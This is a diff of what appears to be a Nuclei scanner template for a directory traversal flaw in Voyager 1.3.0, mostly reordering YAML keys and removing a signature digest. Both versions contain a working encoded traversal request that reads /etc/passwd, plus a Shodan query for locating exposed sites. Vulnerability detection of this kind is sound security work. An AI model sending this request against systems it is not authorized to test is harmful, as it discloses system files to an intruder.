@@ -1,5 +1,4 @@
 id: voyager-lfi
-
 info:
   name: Voyager 1.3.0 - Directory Traversal
   author: mammad_rahimzada
@@ -13,31 +12,26 @@ info:
     cwe-id: CWE-22
     cpe: cpe:2.3:a:voyager_project:voyager:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
-    shodan-query: html:"voyager-assets"
     product: voyager
+    shodan-query: html:"voyager-assets"
     vendor: voyager_project
-  tags: voyager,lfi
-
+    verified: true
+  tags: lfi,voyager,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
+  - matchers:
+      - part: body
         regex:
-          - "root:.*:0:0:"
-
-      - type: word
-        part: header
+          - 'root:.*:0:0:'
+        type: regex
+      - part: header
+        type: word
         words:
-          - "text/plain"
-
-      - type: status
-        status:
+          - text/plain
+      - status:
           - 200
-# digest: 4a0a004730450220352cac1f0deebadb2b2e89fe464a6816d705f5f45ec1db91c85df633234f86ac022100928fc2fab3a97342e038bbe1bc4a4f183e60f2b7728854962ab3b730dbe12530:922c64590222798bb761d5b6d8e72950
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd'
